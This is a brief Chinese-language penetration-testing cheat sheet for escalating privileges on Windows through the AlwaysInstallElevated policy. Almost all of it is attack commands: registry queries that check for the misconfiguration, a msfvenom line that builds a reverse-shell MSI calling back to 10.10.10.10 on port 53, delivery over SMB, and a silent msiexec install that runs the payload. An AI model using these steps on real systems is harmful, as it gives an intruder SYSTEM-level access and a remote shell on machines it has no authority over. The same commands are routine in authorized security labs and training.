# AlwaysInstallElevated

> **AlwaysInstallElevated**\
> **0x1**

```python
1. 查询（看有没有0x1）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

2. 生成msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
传递
用smb即可
安装
3. msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
